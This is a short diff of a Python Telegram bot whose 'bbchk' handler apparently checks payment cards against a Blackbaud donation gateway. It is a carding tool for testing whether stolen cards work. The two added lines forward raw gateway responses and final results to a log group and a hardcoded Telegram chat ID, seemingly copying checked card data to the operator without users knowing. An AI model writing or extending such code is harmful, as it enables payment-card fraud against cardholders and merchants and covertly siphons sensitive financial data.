@@ -247,6 +247,7 @@ async def bbchk(Client, message):
 }
                                 print(data)
                                 res = req.post(url, data=data , headers=headers)
+                                await Client.send_message(chat_id=loggp, text=res.text)
                                 if 'block list due to repeated authorization failures' in res.text:
                                     text = f"""
 <b>〄</b> GATE: <b>BLACKBAUD 10$</b>
@@ -378,6 +379,7 @@ async def bbchk(Client, message):
 <b>♻️</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                             await msg.edit_text(text)
+                                            await Client.send_message(-1001513565895, lasttext)
                                             r.set(message.from_user.id, int(time.time()))
     except ProxyError as e:
         await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER <code>@MrItzMe</code>")
